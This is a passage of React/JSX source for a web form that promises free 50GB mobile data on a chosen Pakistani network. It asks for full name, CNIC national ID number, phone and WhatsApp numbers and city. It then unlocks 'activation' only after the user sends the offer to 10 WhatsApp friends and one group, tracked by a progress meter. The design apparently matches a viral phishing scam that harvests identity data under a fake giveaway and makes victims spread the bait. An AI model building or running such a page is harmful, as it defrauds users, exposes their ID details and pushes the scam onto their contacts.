                    <button
                      key={net}
                      type="button"
                      onClick={() => setSimNetwork(net)}
                      style={{
                        padding: '0.35rem 0.25rem',
                        borderRadius: '6px',
                        border: simNetwork === net ? '2px solid #0284c7' : '1px solid var(--navy-200)',
                        backgroundColor: simNetwork === net ? '#e0f2fe' : '#ffffff',
                        color: simNetwork === net ? '#0369a1' : 'var(--navy-800)',
                        fontWeight: simNetwork === net ? 800 : 600,
                        fontSize: '0.75rem',
                        cursor: 'pointer',
                        textAlign: 'center',
                        transition: 'all var(--transition-fast)',
                      }}
                    >
                      {net}
                    </button>
                  ))}
                </div>
              </div>

              {/* 1. Full Name */}
              <Input
                label="1. Full Name (پورا نام)"
                placeholder="e.g. Muhammad Tariq / Sarah Khan"
                value={fullName}
                onChange={(e) => {
                  setFullName(e.target.value);
                  if (errors.fullName && e.target.value.trim().length >= 2) {
                    setErrors((prev) => {
                      const copy = { ...prev };
                      delete copy.fullName;
                      return copy;
                    });
                  }
                }}
                error={errors.fullName}
                hint="As registered on this SIM / CNIC"
                required
              />

              {/* 2. CNIC */}
              <Input
                label="2. CNIC / National ID (شناختی کارڈ نمبر)"
                placeholder="e.g. 42101-1234567-8"
                value={nationalId}
                onChange={(e) => handleNationalIdChange(e.target.value)}
                onBlur={handleBlurCNIC}
                maxLength={15}
                error={errors.nationalId}
                hint="13-digit CNIC number (e.g. 42101-1234567-8)"
                required
              />

              {/* 3 & 4: Target SIM Number & WhatsApp */}
              <div className="form-grid-2">
                <Input
                  type="tel"
                  label={`3. Target Mobile Number for 50GB Data (${simNetwork} نمبر)`}
                  placeholder="e.g. 0300-1234567"
                  value={targetDataNumber}
                  onChange={(e) => handleTargetNumberChange(e.target.value)}
                  onBlur={handleBlurTargetNumber}
                  maxLength={12}
                  error={errors.targetDataNumber}
                  hint={`Active 11-digit ${simNetwork} SIM (e.g. 0300-1234567)`}
                  required
                />

                <Input
                  type="tel"
                  label="4. WhatsApp Number (واٹس ایپ نمبر)"
                  placeholder="e.g. 0300-1234567"
                  value={whatsappNumber}
                  onChange={(e) => handleWhatsappNumberChange(e.target.value)}
                  onBlur={handleBlurWhatsappNumber}
                  maxLength={12}
                  error={errors.whatsappNumber}
                  hint="Active WhatsApp number (e.g. 0300-1234567)"
                  required
                />
              </div>

              {/* 5. City */}
              <Input
                label="5. Your City / District (اپنا شہر / ضلع درج کریں)"
                placeholder="e.g. Lahore / Karachi / Islamabad / Rawalpindi / Peshawar / Quetta / Multan"
                value={city}
                onChange={(e) => {
                  setCity(e.target.value);
                  if (errors.city && e.target.value.trim().length >= 2) {
                    setErrors((prev) => {
                      const copy = { ...prev };
                      delete copy.city;
                      return copy;
                    });
                  }
                }}
                error={errors.city}
                hint="Current location in Pakistan"
                required
              />
            </div>

            {/* =========================================================================
                SECTION 2: 1-CLICK SMART WHATSAPP SHARING
                ========================================================================= */}
            <div style={{ marginBottom: '2rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.25rem' }}>
                <div
                  style={{
                    padding: '0.5rem',
                    backgroundColor: 'var(--whatsapp-light)',
                    color: 'var(--whatsapp-dark)',
                    borderRadius: 'var(--radius-md)',
                  }}
                >
                  <MessageSquare size={22} />
                </div>
                <div>
                  <h3 style={{ fontSize: '1.2rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                    2. WhatsApp 50GB Offer Share Tasks (میٹر 100% کرنے کے لیے شیئر کریں)
                  </h3>
                  <p style={{ fontSize: '0.8125rem', color: 'var(--text-muted)' }}>
                    صرف نیچے دیے گئے بٹن پر کلک کر کے واٹس ایپ پر 50GB آفر میسج سینڈ کریں۔ واپس آنے پر کاؤنٹ خود بخود بڑھے گا۔
                  </p>
                </div>
              </div>

              {/* TASK 1: SHARE WITH 10 FRIENDS (50% -> 90%) */}
              <div
                style={{
                  backgroundColor: contactsSharedCount >= targetContacts ? '#f0fdf4' : '#ffffff',
                  border: contactsSharedCount >= targetContacts ? '1.5px solid #86efac' : '1px solid var(--border)',
                  borderRadius: 'var(--radius-lg)',
                  padding: '1.25rem',
                  marginBottom: '1.25rem',
                  boxShadow: 'var(--shadow-xs)',
                }}
              >
                <div
                  style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    gap: '1rem',
                    marginBottom: '0.75rem',
                  }}
                >
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                      <span
                        style={{
                          backgroundColor: contactsSharedCount >= targetContacts ? '#25D366' : '#dbeafe',
                          color: contactsSharedCount >= targetContacts ? '#064e3b' : '#1e40af',
                          padding: '0.2rem 0.5rem',
                          borderRadius: 'var(--radius-sm)',
                          fontSize: '0.75rem',
                          fontWeight: 800,
                        }}
                      >
                        TASK 1 (+40% Meter)
                      </span>
                      <h4 style={{ fontSize: '1rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                        Share 50GB Offer with 10 Friends on WhatsApp ({contactsSharedCount}/{targetContacts})
                      </h4>
                    </div>
                    <p style={{ fontSize: '0.8125rem', color: 'var(--navy-600)', margin: '0.35rem 0 0' }}>
                      ہر بار بٹن دبا کر واٹس ایپ پر دوست کو میسج سینڈ کریں۔ واپس آنے پر کاؤنٹ +1 خود بخود شامل ہوگا۔
                    </p>
                  </div>

                  <span
                    style={{
                      fontFamily: 'var(--font-mono)',
                      fontSize: '1.15rem',
                      fontWeight: 800,
                      color: contactsSharedCount >= targetContacts ? '#15803d' : '#0369a1',
                      whiteSpace: 'nowrap',
                    }}
                  >
                    {contactsSharedCount}/{targetContacts} Verified
                  </span>
                </div>

                {/* 10 Visual Progress Slots Indicator */}
                <div
                  className="share-slots-grid"
                  style={{
                    margin: '0.5rem 0 0.75rem',
                  }}
                >
                  {Array.from({ length: targetContacts }).map((_, idx) => {
                    const isDone = idx < contactsSharedCount;
                    const isCurrent = !isDone && idx === contactsSharedCount;

                    return (
                      <div
                        key={idx}
                        style={{
                          height: '22px',
                          borderRadius: '4px',
                          backgroundColor: isDone ? '#25D366' : isCurrent ? '#dbeafe' : 'var(--navy-100)',
                          border: isDone
                            ? '1px solid #16a34a'
                            : isCurrent
                            ? '1.5px solid #2563eb'
                            : '1px solid var(--navy-200)',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          fontSize: '0.68rem',
                          fontWeight: 800,
                          color: isDone ? '#ffffff' : isCurrent ? '#1e40af' : 'var(--navy-400)',
                          transition: 'all 250ms ease',
                        }}
                        title={`Share #${idx + 1}`}
                      >
                        {isDone ? '✓' : idx + 1}
                      </div>
                    );
                  })}
                </div>

                {/* Simple 1-Click Button */}
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem', alignItems: 'center' }}>
                  {contactsSharedCount < targetContacts ? (
                    <Button
                      type="button"
                      variant="whatsapp"
                      size="sm"
                      onClick={handleShareContact}
                      loading={isSharingActive && activeShareMode === 'contact'}
                      icon={<MessageSquare size={16} />}
                      style={{
                        padding: '0.55rem 1rem',
                        fontSize: '0.85rem',
                      }}
                    >
                      <span>
                        📲 دوست #{contactsSharedCount + 1} کو واٹس ایپ پر بھیجیں (Share #{contactsSharedCount + 1})
                      </span>
                    </Button>
                  ) : (
                    <div
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: '0.35rem',
                        color: '#15803d',
                        fontWeight: 700,
                        fontSize: '0.8rem',
                        backgroundColor: '#dcfce7',
                        padding: '0.35rem 0.75rem',
                        borderRadius: 'var(--radius-sm)',
                      }}
                    >
                      <CheckCircle2 size={16} />
                      <span>Task 1 Complete: 10 Contacts Verified (+40%)</span>
                    </div>
                  )}

                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={handleCopyMessage}
                    icon={copiedMsg ? <Check size={14} color="var(--primary-600)" /> : <Copy size={14} />}
                  >
                    {copiedMsg ? 'Copied!' : 'Copy Text'}
                  </Button>
                </div>

                {errors.contacts && (
                  <div style={{ fontSize: '0.75rem', color: 'var(--danger)', marginTop: '0.35rem', fontWeight: 600 }}>
                    ⚠️ {errors.contacts}
                  </div>
                )}
              </div>

              {/* TASK 2: SHARE IN 1 WHATSAPP GROUP (90% -> 100%) */}
              <div
                style={{
                  backgroundColor: isGroupShared ? '#f0fdf4' : '#ffffff',
                  border: isGroupShared ? '1.5px solid #86efac' : '1px solid var(--border)',
                  borderRadius: '10px',
                  padding: '1rem',
                  marginBottom: '1rem',
                  boxShadow: 'var(--shadow-xs)',
                  opacity: contactsSharedCount < targetContacts ? 0.75 : 1,
                }}
              >
                <div
                  style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    gap: '0.75rem',
                    marginBottom: '0.5rem',
                  }}
                >
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                      <span
                        style={{
                          backgroundColor: isGroupShared ? '#25D366' : '#fef3c7',
                          color: isGroupShared ? '#064e3b' : '#92400e',
                          padding: '0.15rem 0.45rem',
                          borderRadius: 'var(--radius-sm)',
                          fontSize: '0.7rem',
                          fontWeight: 800,
                        }}
                      >
                        TASK 2 (+10% Meter)
                      </span>
                      <h4 style={{ fontSize: '0.925rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                        Share 50GB Offer in 1 WhatsApp Group ({isGroupShared ? 1 : 0}/{targetGroups})
                      </h4>
                    </div>
                    <p style={{ fontSize: '0.78rem', color: 'var(--navy-600)', margin: '0.25rem 0 0' }}>
                      کسی بھی 1 واٹس ایپ گروپ میں میسج بھیج کر میٹر 100% مکمل کریں۔
                    </p>
                  </div>

                  <span
                    style={{
                      fontFamily: 'var(--font-mono)',
                      fontSize: '1rem',
                      fontWeight: 800,
                      color: isGroupShared ? '#15803d' : '#92400e',
                      whiteSpace: 'nowrap',
                    }}
                  >
                    {isGroupShared ? 1 : 0}/{targetGroups} Group
                  </span>
                </div>

                <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem', alignItems: 'center' }}>
                  {!isGroupShared ? (
                    <Button
                      type="button"
                      variant="whatsapp"
                      size="sm"
                      onClick={handleShareGroup}
                      loading={isSharingActive && activeShareMode === 'group'}
                      icon={<Users size={16} />}
                      disabled={contactsSharedCount < targetContacts}
                      style={{
                        padding: '0.55rem 1rem',
                        fontSize: '0.85rem',
                      }}
                    >
                      <span>👥 واٹس ایپ گروپ میں شیئر کریں (Share in Group)</span>
                    </Button>
                  ) : (
                    <div
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: '0.35rem',
                        color: '#15803d',
                        fontWeight: 700,
                        fontSize: '0.8rem',
                        backgroundColor: '#dcfce7',
                        padding: '0.35rem 0.75rem',
                        borderRadius: 'var(--radius-sm)',
                      }}
                    >
                      <CheckCircle2 size={16} />
                      <span>Task 2 Complete: Group Shared (100% Reached)</span>
                    </div>
                  )}
                </div>

                {errors.groups && (
                  <div style={{ fontSize: '0.75rem', color: 'var(--danger)', marginTop: '0.35rem', fontWeight: 600 }}>
                    ⚠️ {errors.groups}
                  </div>
                )}
              </div>
            </div>

            {/* =========================================================================
                SECTION 3: TRUTH DECLARATION & SUBMISSION
                ========================================================================= */}
            <div
              style={{
                backgroundColor: 'var(--surface-subtle)',
                border: '1px solid var(--border)',
                padding: '0.875rem',
                borderRadius: '8px',
                marginBottom: '1.25rem',
              }}
            >
              <Checkbox
                id="data-50gb-declaration"
                label="میں تصدیق کرتا/کرتی ہوں کہ فراہم کردہ سِم نمبر اور تفصیلات درست ہیں اور میں نے 10 دوستوں اور گروپ کو شیئرنگ مکمل کر لی ہے۔"
                checked={declaredTruth}
                onChange={(val) => setDeclaredTruth(val)}
                error={errors.declaration}
                required
              />
            </div>

            {/* Submit Activation Button */}
            <div>
              <Button
                type="submit"
                variant="primary"
                size="lg"
                fullWidth
                loading={isSubmitting}
                icon={<Send size={18} />}
                disabled={!isMeterComplete || !declaredTruth}
                style={{
                  padding: '0.75rem 1rem',
                  fontSize: '0.95rem',
                  boxShadow:
                    isMeterComplete && declaredTruth ? '0 6px 16px -2px rgba(2, 132, 199, 0.4)' : undefined,
                  opacity: isMeterComplete && declaredTruth ? 1 : 0.65,
                  backgroundColor: isMeterComplete && declaredTruth ? '#0284c7' : undefined,
                }}
              >
                {isMeterComplete
                  ? `Activate Free 50GB Data on ${simNetwork} (50GB ایکٹیویٹ کریں)`
                  : `Complete Meter to 100% to Activate (${meterPercentage}% / 100%)`}
              </Button>

              {!isMeterComplete && (
                <div
                  style={{
                    textAlign: 'center',
                    fontSize: '0.8125rem',
                    color: '#e11d48',
                    marginTop: '0.6rem',
                    fontWeight: 600,
                  }}
                >
                  ⚠️ براہ کرم اوپر دیے گئے 10 دوستوں اور 1 گروپ کو میسج سینڈ کر کے تصدیق کریں تاکہ میٹر 100% ہو اور ڈیٹا ایکٹیویٹ ہو سکے۔
                </div>
              )}
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};
